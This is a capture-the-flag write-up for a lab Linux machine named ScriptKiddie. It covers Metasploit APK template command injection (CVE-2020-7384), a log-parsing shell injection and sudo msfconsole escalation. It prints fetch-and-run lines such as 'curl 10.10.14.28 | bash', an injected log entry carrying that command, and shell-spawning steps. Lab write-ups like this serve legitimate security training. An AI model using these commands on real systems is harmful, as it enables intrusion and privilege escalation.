# ScriptKiddie

**Difficulty:** Medium | **OS:** Linux | **IP:** `10.129.95.150`

## Summary
**ScriptKiddie** is a medium-difficulty Linux machine that highlights risks associated with vulnerable template processing in exploit frameworks, insecure log parsing via shell evaluation, and overly permissive `sudo` rights on administrative toolsets. Initial access is achieved by exploiting a command injection vulnerability (**CVE-2020-7384**) within the Metasploit APK template feature exposed through a web interface. Lateral movement to user `pwn` is completed by exploiting a command injection flaw inside a background log-scanning script (`scanlosers.sh`) that processes untrusted IP address fields. Finally, privilege escalation to `root` is accomplished by leveraging sudo rights on `msfconsole`, utilizing the interactive Ruby shell (`irb`) to spawn an elevated terminal.

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating active TCP ports and identifying service versions:

- **22**: SSH (OpenSSH 8.2p1 (Ubuntu 4ubuntu0.1))
- **5000**: HTTP (Werkzeug httpd 0.16.1 (Python Flask Application))

### Web Application Enumeration
Visiting the web interface hosted on port 5000 reveals a utility portal that mimics exploit generation tools (allowing users to search exploits, build payloads, and process APK templates). Searching public vulnerability databases for the underlying software versions identifies a known command injection flaw.

## Exploitation (Initial Access)

### Metasploit APK Template Command Injection (CVE-2020-7384)
Metasploit versions prior to 6.0.9 contain a command injection vulnerability when generating Android APK payloads using custom template files.

- **Vulnerability Mechanism:** When parsing a user-supplied APK template file, msfvenom passes component names or metadata fields directly into shell execution routines without proper sanitization.
- **Execution:**
  1) Crafting a malicious APK template containing shell commands within the metadata or payload parameters.
  2) Alternatively, setting up a reverse shell payload script and uploading a crafted request via the web interface that executes a retrieval command (e.g., `curl 10.10.14.28 | bash`).
  3) Setting up a local network listener (`nc -nlvp 443`) and submitting the payload file triggers execution.
  4) An incoming connection establishes an active shell under the user context of `kid`, allowing retrieval of `user.txt`.

## Lateral Movement (pwn)

### Log File Analysis & Command Injection
Inspecting user directories reveals a log folder containing a file named `hackers` (`/home/kid/logs/hackers`), which updates dynamically. Investigating system scripts uncovers a background automation script (`scanlosers.sh`) located under `/home/pwn/`:

```
#!/bin/bash
log=/home/kid/logs/hackers
cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done
if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

- **Vulnerability Analysis:** The script reads entries from the `hackers` log file, extracts IP address fields, and passes them directly into a shell evaluation command (`sh -c "nmap ... ${ip}"`) without input validation.
- **Exploitation Workflow:**
  1) Appending a crafted string containing command injection separators (such as semicolons `;` or pipes `|`) into the log file allows executing arbitrary commands as user `pwn`:

     ```
     echo "[2026-09-06 11:02:58.213161] 10.10.14.28; whoami | curl 10.10.14.28 | bash #" > /home/kid/logs/hackers
     ```

  2) Once the script processes the log entry, the injected command executes, granting access or spawning a reverse shell under user pwn.

## Privilege Escalation (Root Flag)

### Sudo Permission Enumeration
Checking assigned `sudo` execution rights for user `pwn` via `sudo -l` reveals administrative access over Metasploit Framework tools:

```
User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

### Interactive Ruby (irb) Escalation
The `msfconsole` utility includes an interactive Ruby shell (`irb`) that permits executing system commands directly within the application runtime environment.

- **Privilege Escalation Workflow:**
  1) Execute `msfconsole` with `sudo` privileges:

      ```
      sudo /opt/metasploit-framework-6.0.9/msfconsole
      ```

  2) Once the console loads, open an interactive Ruby interpreter session or invoke system execution commands directly from the prompt:

     ```
     irb
     system("bash")
     ```
     
  3) The spawned shell inherits the elevated root execution context of the sudo process.

Full administrative `root` access is acquired, enabling retrieval of root.txt from `/root/root.txt`.
